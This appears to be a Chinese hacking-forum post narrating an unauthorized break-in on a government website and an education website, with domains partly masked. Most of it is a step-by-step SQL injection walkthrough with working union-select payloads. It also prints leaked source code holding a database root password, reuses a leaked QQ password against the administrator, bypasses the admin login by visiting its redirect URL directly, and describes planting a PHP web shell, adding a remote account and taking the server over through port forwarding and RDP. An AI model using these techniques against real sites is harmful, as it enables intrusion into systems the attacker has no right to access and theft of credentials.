@@ -1,0 +1,135 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+全手工注入某站笔记
+D8888D主贴内容-------------------------------------------------------
+PS：听说进来都要发原创，不然会给清理???暂时用以前发的先露下面。。
+QQ：283234361  
+博客：[url=http://www.hjw8.com]链接标记www.hjw8.com[/url] 
+
+然后偶然的机会，看到了一个政府站。说明下：之前我发的教程，给
+
+不法分子利用拿去挂马
+
+这次所涉及的站点，都用XXXXX代替，只需要懂得怎么去搞，知道思路就行，不
+
+需要你再去验证，OK？？而且这次渗透是有意外收获的，欲知后事如何，请看
+
+下去··PS：因为是文字教程，没有做视频说明的那样直观，大家可以到我博
+
+客去问，文字带有局限性，希望大家理解。。。。。。。
+1.注入点：[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213[/url]
+2.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213'[/url]  出错，直接爆
+
+目录出来了·D:\www\XXXXXX\cyqjs\127483935.php  非常好。
+3.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213[/url] and 1=1 正常
+4.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213[/url] and 1=2 出错 
+5.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213[/url] order by 3 出
+
+错
+6.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=213[/url] order by 2 正
+
+常  确定是 2
+7.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-213[/url] union select 
+
+1,2 现在在1 2都可以查询
+8.查下用户。[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-213]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-213[/url] 
+
+union select 1,user()
+上传作者:admin　文章来源:行政办公室　更新时间: cyqjs@localhost   貌似
+
+不是ROOT权限，不能load_file，只能爆后台密码了
+9.查看是什么版本的。h[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?[/url]
+
+id=-213 union select 1,version()
+是5.0.51a-community-nt的
+10.[url=http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-2133]链接标记http://www.XXXXXXX.gov.cn/cyqjs/127483935.php?id=-2133[/url] union 
+
+select 1,group_concat(table_name) from information_schema.tables 
+
+where table_schema=database()-- 只显示出 几个表：
+
+mailbox,news,photo,upload 饿，没有什么重要的，我开始以为限制了就用
+
+substring()函数，都是无法爆出有用的。这下陷入困境了。。表都没有，怎么
+
+爆密码呢？想了想，难道要去社工下？？那要多累啊？哎··没办法，还是百
+
+度搜索下 情况先。。
+11.在他下面，见到了一个邮箱，和一个QQ。。然后用他QQ百度一下，竟然意外
+
+的在一个黑客论坛发现有他的QQ，不过是人家在送号，呵呵，原来当年他的QQ
+
+被盗，在网上 给人乱送人，上面有他的QQ密码呢（从密码可以看出他的名字，
+
+还知道他的年龄，他在百度空间的相片等等，这个就不一一多说了，最后也是
+
+没用上的。。。。）我想，这个会不会就是他的密码？？抱着试试看的心情试
+
+了一下，- -！ 没成功！！呵呵 ，让大家失望了，呵呵。。。。继续看吧。。
+
+无意中的时候，发现了一个教育网，上网写着技术支持也是这个丫的。。。我
+
+想都是他写的PHP源码的话，应该也是漏洞百出吧，然后按照刚才上面的注入过
+
+程，来OOXX了一次，这次可是意外收获哦。。。
+12.因为上面哪个站点用户权限不是ROOT，但是现在找的这个可不同了，可是
+
+ROOT权限啊，这下可以load_file查出MYSQL用户，后台密码也是迟早的事了。
+
+。注入点：[url=http://www.XXXXX.net/cjsjjs/127320.php?id=13]链接标记http://www.XXXXX.net/cjsjjs/127320.php?id=13[/url] 用户：root 路
+
+径在报错时候出现，查到MYSQL数据库：
+$con=mysql_connect("localhost","root","nbm3x4");    
+mysql_select_db("edudata");
+mysql_query("set names gbk"); 
+$result=mysql_query("update news set renum=renum+1 where 
+
+id=$id",$con);
+$sql="select renum,date from news where id=$id";
+$result=mysql_query($sql,$con);
+$record=mysql_fetch_array($result);
+$renum=$record["renum"];
+$date=$record["date"];
+mysql_close($con);
+拿SHELL也是很容易的，直接导一句话就行了，网上很多这样的教程，就不多叽
+
+歪了。。。
+不过我现在说的是另外一个通过源码绕过后台密码。。呵呵
+13.我查询下后台文件logon.php的源码，发现跳转的是login.php，查询下这个
+
+文件出现了下面这个源码：
+if ($username==$name and $userpassword==$password)
+{
+echo "<script language='javascript'>location.href='admin/index.php?
+
+id=$id&writer=$writer&level=$level&logon_name=$logon_name'; 
+
+</script>";
+}
+else
+{
+echo "<br><br><div align=center><a href=logon.php>[密码错误！请返回]
+
+</a>";
+
+他大概意思 我猜是密码正确就跳转到admin/index.php?
+
+id=$id&writer=$writer&level=$level&logon_name=$logon_name这个后台？否
+
+则又返回开始登录的logon.php文件，那我直接访问
+
+[url=http://www.XXXXX.net/admin/index.php?]链接标记http://www.XXXXX.net/admin/index.php?[/url]
+
+id=$id&writer=$writer&level=$level&logon_name=$logon_name这个后台，成
+
+功绕过后台，哇咔咔。。。拿SHELL也是很简单的，直接在下载资源里上传PHP
+
+文件。。权限也很大，直接添加远程帐号密码，不过是内网，LCX工具端口转发
+
+，登录3389，服务器沦陷。。。。
+14.回到刚才那个政府网，我们不是说了吗？ 这两个站源码都是同一个人设置
+
+的？？那这个后台用了绕过代码，那我开始的目标站。。大家可以想象得到什
+
+么了没？？？？？？只可意会，不可言明。。。。。。。。。。。。。。。。
